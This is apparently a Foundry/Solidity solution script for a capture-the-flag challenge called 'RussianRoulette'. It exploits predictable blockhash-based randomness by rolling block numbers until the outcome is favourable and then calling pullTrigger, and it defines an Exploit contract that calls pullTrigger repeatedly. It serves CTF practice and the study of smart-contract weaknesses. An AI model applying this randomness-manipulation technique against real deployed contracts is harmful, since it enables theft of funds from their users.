// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "./RussianRoulette.sol";
import "./Setup.sol";
import {Vm} from "forge-std/Vm.sol";

event Log(string message, uint256 amount);
event Log(string message, int256 amount);
function playerScript(address _target, Vm vm) {
    Setup target = Setup(_target);
    RussianRoulette russianRoulette = RussianRoulette(target.TARGET());
    Exploit exploit = new Exploit(russianRoulette);
    int256 used_block = 1;
    int i = 0;

    while (uint256(blockhash(block.number - 1)) % 10 != 7 && i < 100) {
        used_block++;
        vm.roll(uint256(used_block));
        emit Log("trying to get the block", used_block);
        emit Log("trying to the block", block.number);
        emit Log("with result", uint256(blockhash(block.number - 1)) % 10);
        i++;
    }
    emit Log("get the block", used_block);
    emit Log("result", uint256(blockhash(block.number - 1)) % 10);
    russianRoulette.pullTrigger();
    // require(target.isSolved(), "Exploit failed");
}

function doTransaction(address _target, uint256 amount, Vm vm) {
    Setup target = Setup(_target);
    Exploit exploit = new Exploit(RussianRoulette(target.TARGET()));
    uint256 curr_block = block.number;
    for (uint256 i = 0; i < amount; i++) {
        // vm.roll(curr_block);
        exploit.attack();
        curr_block++;
    }
}

contract Exploit {
    RussianRoulette public russianRoulette;

    event balance(string message, uint256 amount);
    constructor(RussianRoulette target) {
        russianRoulette = target;
    }

    function attack() public {
        emit Log("trying to the block", block.number);
        emit Log("result", uint256(blockhash(block.number - 1)) % 10);
        russianRoulette.pullTrigger();
    }

    receive() external payable {}
}
